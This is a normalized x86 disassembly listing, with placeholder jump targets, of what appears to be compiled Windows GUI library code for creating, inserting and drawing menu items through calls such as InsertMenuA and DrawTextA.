mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_436404
sub_434314
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_436478
sub_434334
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4364cc
sub_434354
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_434370
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_405584
sub_434394
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4365f8
sub_4343b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4365d4
sub_4343d4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4365e8
sub_4343f4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_434420
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41ffc4
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_433f04
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_436f10
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_43449c
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_439170
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_4365a0
test eax eax
jg r-xdata
mov edx esi
call sub_43693c
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_4365b0
call sub_404650
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_404650
lea eax [ esi + 0x44 ]
call sub_40f944
lea eax [ esi + 0x78 ]
call sub_40f944
movzx eax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_4348ac
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_419d70
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420010
test bl bl
jle r-xdata
call sub_404650
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_434550
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x5 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4347a1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4347a8
lea eax [ ebp - 0x3c ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x30 ]
call sub_4055c8
mov eax ebx
call sub_4365a0
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_434a54
mov [ ebp - 0x22 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_405974
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
movzx eax [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_4365a0
test eax eax
jle r-xdata
mov [ ebp - 0x36 ] 0x2c
mov [ ebp - 0x32 ] 0x3f
mov eax ebx
call sub_436b60
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0x3c ]
movzx eax [ ebx + 0x60 ]
call sub_433b40
push [ ebp - 0x3c ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4058e0
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_4059dc
push eax
mov eax ebx
call sub_434a54
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_436174
test eax eax
jne r-xdata
mov [ ebp - 0x6 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_405974
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
movzx ecx [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
movzx edx [ ebp - 0x5 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x6 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2e ] eax
movzx eax [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2a ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x26 ] eax
xor eax eax
mov [ ebp - 0x22 ] eax
xor eax eax
mov [ ebp - 0x1e ] eax
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
mov [ ebp - 0x12 ] eax
mov eax ebx
call sub_4365a0
test eax eax
jle r-xdata
lea eax [ ebp - 0x36 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_434a54
mov [ ebp - 0x22 ] eax
sub_4347bf
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx ecx [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_434550
xor eax eax
pop ebp
retn
sub_4347e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4383e0
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43718c
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_437674
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_433f88
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_434854
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43489e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41ea20
mov eax [ ebp - 0x4 ]
call sub_433dc0
mov edx eax
mov eax ebx
call sub_4365d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4348a5
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4348ac
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_434924
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_420098
sub_4348e8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_42042c
mov eax ebx
call sub_436588
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_436588
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_40484c
pop esi
pop ebx
retn
mov eax ebx
call sub_434924
sub_434924
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_434a54
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_434924
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_434a54
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_434a54
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_4347e4
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax ebp
call sub_434a54
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4349f4
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_4365a0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_4365b0
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_4365b0
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_4365b0
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_433a94
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_434a54
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_4347e4
mov eax [ rw-data ]
call sub_433a94
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_434aa0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420354
push ebx
push sub_434854
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_434ae4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_434cd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_436b60
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_4055c8
test bh 0x4
je r-xdata
mov eax edi
call sub_4383e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_4250d4
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_424a7c
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_424a88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434cd7
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
call sub_425714
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x8 ]
call sub_425714
push eax
call DrawTextA
sub esi 0x4
mov esi [ esi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4246fc
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_4246fc
mov eax 0xff00000d
call sub_424230
mov esi eax
mov eax 0xff000010
call sub_424230
cmp esi eax
jne r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x8 ]
call sub_425714
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
sub esi 0x4
mov esi [ esi ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4246fc
jmp r-xdata
sub_434d3c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_43567e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x22 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
call sub_432228
call sub_432330
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42535c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
call sub_432228
call sub_432330
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424fb8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_424fb8
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4246fc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_424fb8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42535c
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_448978
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425714
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424fb0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424fb8
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_4351cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42a5c4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_4246fc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_448978
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424fb8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42535c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424fb0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42b908
mov edx eax
